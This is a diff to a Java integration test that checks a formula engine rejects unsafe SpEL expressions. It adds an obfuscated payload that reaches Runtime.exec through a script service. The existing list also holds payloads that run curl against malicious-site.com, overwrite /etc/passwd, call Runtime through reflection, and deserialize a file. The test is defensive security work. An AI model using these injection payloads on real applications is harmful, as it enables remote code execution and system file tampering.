@@ -81,7 +81,9 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 	@Test
 	public void testUnsafeFormulas() {
 
-		List<String> unsafeFormulas = List.of("T(java.lang.Runtime).getRuntime().exec('curl http://malicious-site.com')",
+		List<String> unsafeFormulas = List.of(
+				"T(fr.becpg.util.ApplicationContextHelper).getApplicationContext().getBean(\"scriptService\").executeScriptString(\"java.lang.Runtime\"+\".getRuntime()\" + \".ex\" + \"ec('ls')\", null, true);",
+				"T(java.lang.Runtime).getRuntime().exec('curl http://malicious-site.com')",
 				"T(java.nio.file.Files).write(java.nio.file.Paths.get('/etc/passwd'), 'malicious content'.getBytes())",
 				"T(java.lang.Class).forName('java.lang.Runtime').getDeclaredMethod('getRuntime').setAccessible(true).invoke(null)",
 				"T(java.io.ObjectInputStream).newInstance(new java.io.FileInputStream('/tmp/malicious_object.ser')).readObject()",
@@ -111,8 +113,8 @@ public class FormulaFormulationIT extends AbstractFinishedProductTest {
 			inReadTx(() -> {
 				FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
 				DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
-				assertTrue(dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized")
-						|| dynamicCharactListItem.getErrorLog().toString().contains("Expression is unsafe"));
+				assertTrue(dynamicCharactListItem.getErrorLog() != null && (dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized")
+						|| dynamicCharactListItem.getErrorLog().toString().contains("Expression contains unsafe")));
 				return null;
 			});
 		}
